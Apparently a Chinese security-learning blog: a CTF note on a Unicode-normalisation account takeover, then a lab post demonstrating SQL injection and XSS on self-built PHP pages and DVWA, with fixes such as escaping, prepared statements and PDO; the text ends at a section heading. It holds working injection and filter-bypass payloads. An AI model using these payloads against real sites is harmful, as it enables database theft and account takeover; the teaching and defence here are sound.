<p>看wp看到一种神奇的方法，之前听说黑客们很关注，就是不同地区的字符编码的问题，这个方法也是由字符编码变成。<br>app中有一个函数叫nodeprep.prepare，这个函数执行时会将ᴬ变为A，再执行一次的话会将A变为a，那我们在修改密码处有机会将admin的密码覆盖。（这种方法局限性很强，但是很强，做个笔记）</p>
<p>先注册一个ᴬdmin为名字的账号，然后登陆。会看见用户名变为Admin。</p>
<img src="/2020/02/19/buuctf/16.png" class="">

<p>之后修改一次密码，再用修改后的密码登录admin账户</p>
<img src="/2020/02/19/buuctf/17.png" class="">

<p>成功登入。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://kkotori.github.io/2020/02/18/wsks/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="K_Kotori">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="WS">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/18/wsks/" class="post-title-link" itemprop="url">简单SQLI、XSS建站漏洞修复&DVWA&少数RE基础</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2020-02-18 14:35:17 / 修改时间：16:16:19" itemprop="dateCreated datePublished" datetime="2020-02-18T14:35:17+08:00">2020-02-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <html>

<head>
<meta http-equiv=Content-Type content="text/html; charset=gb2312">
<meta name=Generator content="Microsoft Word 15 (filtered)">
<style>
<!--
 /* Font Definitions */
 @font-face
        {font-family:宋体;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:黑体;
        panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
        {font-family:"Cambria Math";
        panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
        {font-family:等线;
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"等线 Light";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:华文中宋;
        panose-1:2 1 6 0 4 1 1 1 1 1;}
@font-face
        {font-family:"\@宋体";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@华文中宋";}
@font-face
        {font-family:"\@黑体";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
        {font-family:"\@等线 Light";}
@font-face
        {font-family:"\@等线";
        panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0cm;
        margin-bottom:.0001pt;
        font-size:12.0pt;
        font-family:宋体;}
h1
        {mso-style-link:"标题 1 字符";
        margin-top:17.0pt;
        margin-right:0cm;
        margin-bottom:16.5pt;
        margin-left:0cm;
        text-align:justify;
        text-justify:inter-ideograph;
        line-height:240%;
        page-break-after:avoid;
        font-size:22.0pt;
        font-family:等线;
        font-weight:bold;}
h2
        {mso-style-link:"标题 2 字符";
        margin-top:13.0pt;
        margin-right:0cm;
        margin-bottom:13.0pt;
        margin-left:0cm;
        text-align:justify;
        text-justify:inter-ideograph;
        line-height:173%;
        page-break-after:avoid;
        font-size:16.0pt;
        font-family:"等线 Light";
        font-weight:bold;}
h3
        {mso-style-link:"标题 3 字符";
        margin-top:13.0pt;
        margin-right:0cm;
        margin-bottom:13.0pt;
        margin-left:0cm;
        text-align:justify;
        text-justify:inter-ideograph;
        line-height:173%;
        page-break-after:avoid;
        font-size:16.0pt;
        font-family:等线;
        font-weight:bold;}
p.MsoToc1, li.MsoToc1, div.MsoToc1
        {margin:0cm;
        margin-bottom:.0001pt;
        font-size:18.0pt;
        font-family:黑体;}
p.MsoToc2, li.MsoToc2, div.MsoToc2
        {margin-top:0cm;
        margin-right:0cm;
        margin-bottom:0cm;
        margin-left:24.0pt;
        margin-bottom:.0001pt;
        font-size:15.0pt;
        font-family:黑体;}
p.MsoToc3, li.MsoToc3, div.MsoToc3
        {margin-top:0cm;
        margin-right:0cm;
        margin-bottom:0cm;
        margin-left:48.0pt;
        margin-bottom:.0001pt;
        font-size:14.0pt;
        font-family:黑体;}
a:link, span.MsoHyperlink
        {color:#0563C1;
        text-decoration:underline;}
p
        {margin-right:0cm;
        margin-left:0cm;
        font-size:12.0pt;
        font-family:宋体;}
p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
        {margin:0cm;
        margin-bottom:.0001pt;
        text-indent:21.0pt;
        font-size:12.0pt;
        font-family:宋体;}
p.MsoTocHeading, li.MsoTocHeading, div.MsoTocHeading
        {margin-top:12.0pt;
        margin-right:0cm;
        margin-bottom:0cm;
        margin-left:0cm;
        margin-bottom:.0001pt;
        line-height:107%;
        page-break-after:avoid;
        font-size:16.0pt;
        font-family:"等线 Light";
        color:#2E74B5;}
span.1
        {mso-style-name:"标题 1 字符";
        mso-style-link:"标题 1";
        font-weight:bold;}
span.2
        {mso-style-name:"标题 2 字符";
        mso-style-link:"标题 2";
        font-family:"等线 Light";
        font-weight:bold;}
span.3
        {mso-style-name:"标题 3 字符";
        mso-style-link:"标题 3";
        font-weight:bold;}
.MsoChpDefault
        {font-family:等线;}
 /* Page Definitions */
 @page WordSection1
        {size:595.3pt 841.9pt;
        margin:72.0pt 90.0pt 72.0pt 90.0pt;
        layout-grid:16.3pt;}
div.WordSection1
        {page:WordSection1;}
 /* List Definitions */
 ol
        {margin-bottom:0cm;}
ul
        {margin-bottom:0cm;}
-->
</style>

</head>

<body lang=ZH-CN link="#0563C1" vlink="#954F72" style='text-justify-trim:punctuation'>

<h2 id="SQLI："><a href="#SQLI：" class="headerlink" title="SQLI："></a><a name="_Toc26366735"><span style='font-size:15.0pt;font-family:黑体'>SQLI：</span></a></h2><p>本次<span
lang=EN-US>WEB</span>实验采用<span lang=EN-US>kali2</span>的环境。由<span lang=EN-US>Linux</span>的一些原因数据库并未采用<span lang=EN-US>MySQL</span>，而是采用了其分支<span lang=EN-US>MariaDB</span>，因此经过简单的<span
lang=EN-US>MariaDB</span>的学习，开始此实验。</p>
<p>首先将环境配置好，并简单的写了一个用于测试<span lang=EN-US>SQLI</span>的网页。</p>
<p>毫无<span lang=EN-US>WAF</span>的代码如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image001.jpg" class=""></span></p>
<p>然后我们先在数据库内添加我们能需要查询的东西</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image002.jpg" class=""><img src="/2020/02/18/wsks/image003.jpg" class=""><img src="/2020/02/18/wsks/image004.jpg" class=""></span></p>
<p>添加完成后</p>
<p>打开<span lang=EN-US><a href="http://127.0.0.1/sqlc.php" target="_blank" rel="noopener"><span style='color:windowtext;text-decoration:none'>http://127.0.0.1/sqlc.php</span></a></span></p>
<h3 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a><a name="_Toc26366736"><span style='font-size:14.0pt;font-family:黑体'>整型注入</span></a></h3><p><span lang=EN-US><img src="/2020/02/18/wsks/image005.jpg" class=""></span></p>
<h3 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a><a name="_Toc26366737"><span style='font-size:14.0pt;font-family:黑体'>字符注入</span></a></h3><p>稍微修改代码</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image006.jpg" class=""></span></p>
<p>再进行字符注入</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image007.jpg" class=""></span></p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><a name="_Toc26366738"><span style='font-size:14.0pt;font-family:黑体'>布尔盲注</span></a></h3><p>接下来按照课本要求简单复现：</p>
<p>布尔型注入查询数据库版本</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image008.jpg" class=""></span></p>
<p>此处没有回显，说明语句判断结果为<span lang=EN-US>false</span>，则查询语句会等价为<span
lang=EN-US>?x=20 and 0</span>，则不执行查询操作。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image009.jpg" class=""></span></p>
<p>没有回显，继续尝试。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image010.jpg" class=""></span></p>
<p>有回显，此时语句等价为<span lang=EN-US>?x=20<br>and 1</span>，则执行查询，并回显。确认数据库版本号为<span lang=EN-US>1</span>。</p>
<p>关于盲注，我们再进行测试的时候一般辅助以脚本，因为其操作过程重复度太高。这里简单写了一个脚本来进行上面的盲注测试。脚本如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image011.jpg" class=""></span></p>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a><a name="_Toc26366739"><span style='font-size:14.0pt;font-family:黑体'>延时注入</span></a></h3><p><span lang=EN-US><img src="/2020/02/18/wsks/image012.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image013.jpg" class=""></span></p>
<p>回车之后，查询会先查询<span lang=EN-US>x=20</span>，之后因为<span
lang=EN-US>and</span>存在会将后面的语句也执行，延时三秒回显，确实可以达到延时效果。将<span lang=EN-US>and</span>改为<span
lang=EN-US>or</span>也可以实现延时，但是会有结果回显。</p>
<h3 id="报错型注入"><a href="#报错型注入" class="headerlink" title="报错型注入"></a><a name="_Toc26366740"><span style='font-size:14.0pt;font-family:黑体'>报错型注入</span></a></h3><p>这类型的注入效果实际得看回显内容的多少，像是我们为了实验而搭建的代码一般不会加过滤或是除了查询目标值回显之外，根本就不会去写回显语句。为了实现报错注入，使用了一个<span
lang=EN-US>mysqli_error()</span>函数。效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image014.jpg" class=""></span></p>
<p>在<span lang=EN-US>?x=20</span>后面加一个单引号会导致引号不能成对而无法匹配，导致数据库报错并通过函数回显错误信息。上面仅仅是一个函数，我们就能通过其报错知道两个重要信息：<span
lang=EN-US>1</span>、数据库类型为<span lang=EN-US>MariaDB</span>。<span lang=EN-US>2</span>、具体过滤了什么字符。（<span
lang=EN-US>WAF</span>测试）</p>
<h3 id="综合注入攻击"><a href="#综合注入攻击" class="headerlink" title="综合注入攻击"></a><a name="_Toc26366741"><span style='font-size:14.0pt;font-family:黑体'>综合注入攻击</span></a></h3><p>结合书上的方法，简单模拟一次攻击。</p>
<p>由以上报错、布尔、延时注入我们已经知道数据库为<span
lang=EN-US>MariaDB</span>，基本没有字符过滤（这是当然的了），语句可以通过关键词组合查询语句，那我们可以使用<span
lang=EN-US>union</span>进行联合查询。</p>
<p>那我们开始尝试爆库</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image015.jpg" class=""></span></p>
<p>我搭建的<span lang=EN-US>sqli</span>，所以我们爆<span lang=EN-US>sqli</span>表</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image016.jpg" class=""></span></p>
<p>继续爆字段</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image017.jpg" class=""></span></p>
<p>过程没什么好解释的，就是一些<span lang=EN-US>MariaDB</span>的基本查询语句。</p>
<p>修复以上漏洞</p>
<p>接下来进行以上漏洞修复。</p>
<p>首先，对于报错注入，我们可以将代码中的回显语句完全去掉。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image018.jpg" class=""></span></p>
<p>或者是限制其回显，这样可以极大提高盲注的难度。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image019.jpg" class=""></span></p>
<p>对于有用户需求的客户端或者是站点来说，回显过于具体会方便入侵，但是完全没有回显对于用户来说也不是好事，这样会使用户体验很差。因此我们一般采取限制其回显内容来防范这类问题。</p>
<p>之后，对于用户能控制的语句和变量，我们需要对其进行过滤来防止恶意语句的传递（<span
lang=EN-US>WAF</span>）。</p>
<p>首先我们知道攻击者可能会通过关键词组合攻击语句。那么我们可以对关键词进行过滤，并过滤部分函数。再严格一些，限制输入类型（过滤大小写）。加入简单正则后的代码如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image020.jpg" class=""></span></p>
<p>效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image021.jpg" class=""></span></p>
<p>会将非法字符进行匹配从而阻止非法语句进入数据库。但是这并不是过滤，而是在发现非法字符之后直接阻止了程序的执行。</p>
<p>将代码逻辑整理一下，最终代码如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image022.jpg" class=""></span></p>
<p>除了上述方法之外，我们还可采用<span lang=EN-US>MySQL</span>降权与预编译语句的方法。我上面的代码中的<span
lang=EN-US>dvwau</span>是拥有所有权限的一个角色。将这样的角色交给用户并不是很安全，因此我们在数据库中操作，将<span
lang=EN-US>dvwau</span>的权限拿掉，只留下部分即可。预编译的话，是预先定义好<span lang=EN-US>sql</span>的查询语句，先用？符号占位，待用户传入参数之后，即可执行。这与一般的查询不一样，预编译是先将语句进入<br>数据库中，之后再传入参数。而现在的做法大多数为等查询语句拼接好之后，再传入数据库执行。形式如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image023.jpg" class=""></span></p>
<p>不同数据库有不同的查询语句，那么随之而来的问题肯定也不一样，<span
lang=EN-US>mysql</span>是这样的，其他的不一定是这样。网上搜索了一番，还发现了一种防御方法也就是现在认为比较安全的方法<span
lang=EN-US>PDO</span>。</p>
<p><span lang=EN-US>PHP </span>数据对象（<span
lang=EN-US>PDO</span>） 扩展为<span lang=EN-US>PHP</span>访问数据库定义了一个轻量级的一致接口。实现<span
lang=EN-US> PDO </span>接口的每个数据库驱动可以公开具体数据库的特性作为标准扩展功能。 注意利用<span lang=EN-US><br>PDO </span>扩展自身并不能实现任何数据库功能；必须使用一个具体数据库的<span lang=EN-US> PDO </span>驱动来访问数据库服务。</p>
<p><span lang=EN-US>PDO </span>提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。<span
lang=EN-US> PDO</span>不提供数据库抽象层；它不会重写<span lang=EN-US> SQL</span>，也不会模拟缺失的特性。如果需要的话，应该使用一个成熟的抽象层。</p>
<p>从<span lang=EN-US> PHP 5.1</span>开始附带了<span
lang=EN-US> PDO</span>，在<span lang=EN-US> PHP 5.0 </span>中是作为一个<span
lang=EN-US> PECL </span>扩展使用。<span lang=EN-US>PDO </span>需要<span lang=EN-US>PHP<br>5</span>核心的新<span lang=EN-US>OO</span>特性，因此不能在较早版本的<span lang=EN-US> PHP </span>上运行。其实<span
lang=EN-US>PDO</span>也才采用了预编译的方法来增强查询语句的安全。</p>
<p><span lang=EN-US>PDO</span>划清了用户输入与代码的界限，不会将用户输入与查询语句进行拼接。关于<span
lang=EN-US>PDO</span>的使用方法，如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image024.jpg" class=""></span></p>
<h2 id="Xss："><a href="#Xss：" class="headerlink" title="Xss："></a><a name="_Toc26366742"><span style='font-size:15.0pt;font-family:黑体'>Xss：</span></a></h2><p>先写个简单的前端和后端的代码</p>
<h3 id="Xss-Reflected"><a href="#Xss-Reflected" class="headerlink" title="Xss_Reflected"></a><a name="_Toc26366743"><span style='font-size:14.0pt;font-family:黑体'>Xss_Reflected</span></a></h3><p><span lang=EN-US><img src="/2020/02/18/wsks/image025.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image026.jpg" class=""></span></p>
<p>效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image027.jpg" class=""></span></p>
<p>简单测试一下<span lang=EN-US>&lt;script&gt;alert(1)&lt;/script&gt;</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image028.jpg" class=""></span></p>
<p>成功弹窗，此类行为反射型<span lang=EN-US>XSS</span>漏洞。</p>
<h3 id="Xss-Stored"><a href="#Xss-Stored" class="headerlink" title="Xss_Stored:"></a><a name="_Toc26366744"><span style='font-size:14.0pt;font-family:黑体'>Xss_Stored:</span></a></h3><p>我们稍微修改一下代码，进行存储型<span lang=EN-US>XSS</span>漏洞测试。我拿前面自己写的<span
lang=EN-US>SQLI</span>页面来用一用。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image029.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image030.jpg" class=""></span></p>
<p>效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image031.jpg" class=""></span></p>
<p>来测试一下。</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image032.jpg" class=""></span></p>
<p>成功弹窗，在<span lang=EN-US>Stored</span>型<span
lang=EN-US>XSS</span>中，我们一旦注入恶意代码成功，那么每次我们访问此页面时服务器都会将我们注入数据库的恶意代码拿出来当作<span
lang=EN-US>script</span>再解析并执行一遍，这就是<span lang=EN-US>Stored</span>型的特点。</p>
<h3 id="Xss-DOM"><a href="#Xss-DOM" class="headerlink" title="Xss_DOM:"></a><a name="_Toc26366745"><span style='font-size:14.0pt;font-family:黑体'>Xss_DOM:</span></a></h3><p>我们再稍微修改一下代码，尝试实现<span lang=EN-US>DOM</span>型漏洞</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image033.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image034.jpg" class=""></span>效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image035.jpg" class=""></span></p>
<p>测试一下</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image036.jpg" class=""></span></p>
<p>成功弹窗，利用成功。到这里基础<span lang=EN-US>XSS</span>代码都复现完了。</p>
<h3 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a><a name="_Toc26366746"><span style='font-size:14.0pt;font-family:黑体'>漏洞修复：</span></a></h3><p>我们开始考虑如何修复这些漏洞。</p>
<p>反射型与<span lang=EN-US>DOM</span>型漏洞都为非持久化漏洞，而<span
lang=EN-US>Stored</span>型持久化漏洞。</p>
<p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>DOM<br>&amp; Reflected</span></p>
<p>首先针对反射型漏洞与<span lang=EN-US>DOM</span>型漏洞，其利用原理是在用户进行数据提交的时候，服务器端将传入的数据当作<span
lang=EN-US>html</span>元素进行了解析，<span lang=EN-US>html</span>元素可包括<span
lang=EN-US>js</span>脚本，也就意味着可以执行恶意代码。如果需要对其进行修复的话，在当我们需要向<span lang=EN-US>html</span>标签之间插入不可信数据的时候，我们可以对其进行<span
lang=EN-US>HTML Entity </span>编码以及特殊字符的过滤，比如将空格转换为<span lang=EN-US>&amp;nbsp ;</span>、<span
lang=EN-US>&lt;</span>转换为<span lang=EN-US>&amp;lt ;</span>等，在进行转义时，不能单纯的将“转为<span
lang=EN-US>\”</span>而是要用<span lang=EN-US>/\”</span>这种方式，或者将除了字母和数字以外的东西全部使用十六进制的编码方式进行编码。<span
lang=EN-US>Php</span>提供了<span lang=EN-US>htmlspecialchars</span>（）函数将输入进行转义变为<span
lang=EN-US>HTML</span>实体编码。</p>
<p><span lang=EN-US style='font-size:14.0pt'>DOM</span><span style='font-size:14.0pt'>：</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image037.jpg" class=""></span></p>
<p><span lang=EN-US style='font-size:14.0pt'>REFLECT</span><span style='font-size:14.0pt'>：</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image038.jpg" class=""></span></p>
<p>效果如下：</p>
<p><span lang=EN-US style='font-size:14.0pt'>DOM</span><span style='font-size:14.0pt'>：</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image039.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image040.jpg" class=""></span></p>
<p><span lang=EN-US style='font-size:
14.0pt'>REFLECTED</span><span style='font-size:14.0pt'>：</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image041.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image042.jpg" class=""></span></p>
<p>更进一步，因为<span lang=EN-US>XSS</span>操作大多数为盗取用户<span
lang=EN-US>cookie</span>，我们可以设置一个<span lang=EN-US>HttpOnly</span>，避免脚本对<span
lang=EN-US>cookie</span>的访问。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>Stored:</span></p>
<p>对于<span lang=EN-US>STORED</span>型，我们采取方法也可以是加上<span
lang=EN-US>HTML</span>实体转义，也要在进行数据库操作的时候进行防范，我可以加入上面的<span lang=EN-US>SQLI</span>的代码。</p>
<p>代码如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image043.jpg" class=""></span></p>
<p>效果如下：</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image044.jpg" class=""></span></p>
<p>不过总的来说，没有绝对安全的防御，当我们引入<span
lang=EN-US>HTML</span>实体的时候又会带来新的<span lang=EN-US>XXE</span>、<span lang=EN-US>SSRF</span>等问题，不过这不属于课程作业的内容，有机会再做<span
lang=EN-US>XXE</span>攻击和防御测试。</p>
<h2 id="DVWA漏洞攻击实现："><a href="#DVWA漏洞攻击实现：" class="headerlink" title="DVWA漏洞攻击实现："></a><a name="_Toc26366747"><span style='font-size:15.0pt;font-family:黑体'>DVWA漏洞攻击实现：</span></a></h2><p>由于是闯关，我就当作写<span lang=EN-US>WP</span>来写了。</p>
<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW:"></a><a name="_Toc26366748"><span style='font-size:14.0pt;font-family:黑体'>LOW:</span></a></h3><p><span style='font-size:14.0pt;font-family:黑体'>Brute Force：</span></p>
<p>用<span
lang=EN-US>Burpsuit</span>截包，然后发送至<span lang=EN-US>intruder</span>：</p>
<p>锁定爆破点</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image045.jpg" class=""></span></p>
<p>选择字典</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image046.jpg" class=""></span>或是进行爆破</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image047.jpg" class=""></span></p>
<p><span
lang=EN-US>Start Attack</span>即可。</p>
<p>都可以得到密码：<span
lang=EN-US>password</span>。</p>
<p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>SQLI:</span></p>
<p>这里先随手一试<span
lang=EN-US>1’ or 1=1 –+’</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image048.jpg" class=""></span></p>
<p>没有任何过滤，简单的闭合单引号并且注释掉后面的语句即可。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>SQLBI:</span></p>
<p>先输入<span
lang=EN-US>1</span>‘ <span lang=EN-US>and substring(version(),1,1)&gt;5 –’,</span>回显</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image049.jpg" class=""></span></p>
<p>再输入<span
lang=EN-US>1</span>‘ <span lang=EN-US>and substring(version(),1,1)&lt;5 –’,</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image050.jpg" class=""></span></p>
<p>逐次尝试<span
lang=EN-US>&lt;4,3,2,1</span>，到<span lang=EN-US>1</span>的时候回显</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image051.jpg" class=""></span></p>
<p>则再尝试<span
lang=EN-US>1</span>‘ <span lang=EN-US>and substring(version(),1,1)=1 –’,</span>回显</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image052.jpg" class=""></span></p>
<p>则可确定数据库版本为<span
lang=EN-US>1</span>。</p>
<p>用同样的方法则可以逐个确定表名，列名，字段名。贴上脚本</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image053.jpg" class=""></span></p>
<p><span style='font-size:14.0pt;font-family:黑体'>Xss_Reflected：</span></p>
<p>输入<span
lang=EN-US>&lt;script&gt;alert(‘1’)&lt;/script&gt;</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image054.jpg" class=""></span></p>
<p><span style='font-size:14.0pt;font-family:黑体'>Xss_Stored:</span></p>
<p>先输入</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image055.jpg" class=""></span></p>
<p>提交之后可以看到</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image056.jpg" class=""></span></p>
<h3 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a><a name="_Toc26366749"><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>Medium</span></a><span style='font-size:14.0pt;font-family:黑体'>：</span></h3><p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>Brute Force</span><span style='font-size:14.0pt;font-family:黑体'>：</span></p>
<p>提交密码之后发现页面回显很慢，猜测可能有延迟，一看代码果不其然。</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image057.jpg" class=""></span></p>
<p>可以修改<span
lang=EN-US>burp suit</span>里<span lang=EN-US>intruder</span>的<span lang=EN-US>option</span>设置进行调整。</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image058.jpg" class=""></span></p>
<p><span style='font-size:14.0pt;font-family:黑体'>SQLI:</span></p>
<p>看到页面变成固定列表了，不能自己输入值了</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image059.jpg" class=""></span>看源码</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image060.jpg" class=""></span>发现传参方式变为了<span lang=EN-US>POST</span>，那么我们抓包修改<span
lang=EN-US>id</span>的值再提交。</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image061.jpg" class=""></span></p>
<p>成功，接下来的步骤与之前的一致，可以使用联合注入，不再重复。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>SQLBI:</span></p>
<p>和<span
lang=EN-US>SQLI</span>很像，估计也是需要抓包，那我们用<span lang=EN-US>burp</span>尝试。</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image062.jpg" class=""></span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image063.jpg" class=""></span></p>
<p>发现可以进行盲注，基本没有过滤。</p>
<p>用脚本不好实现，我们可以用利用<span
lang=EN-US>burp</span>的<span lang=EN-US>intruder</span>功能，先进行如下设置</p>
<p>标记爆破点</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image064.jpg" class=""></span></p>
<p>对<span
lang=EN-US>payload</span>进行设置，上面我们需要爆破数据库版本，所以设置<span lang=EN-US>payload</span>类型为数字，<span
lang=EN-US>&nbsp; </span>范围为<span lang=EN-US>1~128</span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image065.jpg" class=""></span></p>
<p><span
lang=EN-US>Start attack</span>的结果</p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image066.jpg" class=""></span></p>
<p><span lang=EN-US><img src="/2020/02/18/wsks/image067.jpg" class=""></span></p>
<p>会发现有个响应的长度明显比其他的短，那是因为长度为<span
lang=EN-US>4996</span>的那个响应里包含了<span lang=EN-US>exists</span>而长度为<span
lang=EN-US>5002</span>的里面包含了<span lang=EN-US>MISSING</span>所以有长度差别。我们需要的是正确判断的句子，也就是<span
lang=EN-US>exists</span>那个响应的判断语句是对的，也就是说<span lang=EN-US>payload</span>为<span
lang=EN-US>1</span>时，回显<span lang=EN-US>exists</span>，即数据库版本为<span lang=EN-US>1</span>。</p>
<p>可利用此特性进行列名表名字段名的爆破。步骤仍然相同，不再重复。</p>
<p><span style='font-size:14.0pt;font-family:黑体'>Xss_Reflected：</span></p>
<p>随手尝试<span lang=EN-US>&lt;script&gt;alert(‘1’)&lt;/script&gt;</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image068.jpg" class=""></span></p>
<p>看回显可能过滤了<span lang=EN-US>script</span>头</p>
<p>尝试下大小写<span
lang=EN-US>&lt;Script&gt;alert(‘1’)&lt;/Script&gt;</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image069.jpg" class=""></span>成功回显，只过滤了<span lang=EN-US>script</span>，没有用正则匹配。</p>
<p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>XSS_Stored:</span></p>
<p>由上可知先<span
lang=EN-US>&lt;Script&gt;alert(1)&lt;/Script&gt;</span></p>
<p>发现不行，看来不是大小写问题</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image070.jpg" class=""></span></p>
<p>再尝试<span
lang=EN-US>&lt;Scr&lt;Script&gt;ipt&gt;alert(1)&lt;/Sc&lt;Script&gt;ript&gt;</span></p>
<p>还是不行</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image071.jpg" class=""></span></p>
<p>看看源代码</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image072.jpg" class=""></span></p>
<p>发现对<span
lang=EN-US>name</span>只做了简单的过滤处理，将<span lang=EN-US>&lt;script&gt;</span>置换为空。而<span
lang=EN-US>message</span>进行了<span lang=EN-US>html </span>实体转义的操作，很难进行<span
lang=EN-US>XSS</span></p>
<p>但是<span
lang=EN-US>Name</span>可以进行<span lang=EN-US>XSS</span></p>
<p>但是发现输入有长度限制，我们将限制去掉</p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image073.jpg" class=""></span></p>
<p>再输入<span
lang=EN-US>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;script&gt;ript&gt;</span></p>
<p><span
lang=EN-US><img src="/2020/02/18/wsks/image074.jpg" class=""></span></p>
<p>成功弹窗</p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a><a name="_Toc26366750"><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>High</span></a></h3><p><span lang=EN-US style='font-size:14.0pt;font-family:黑体'>Brute Force</span><span style='font-size:14.0pt;font-family:黑体'>：</span></p>
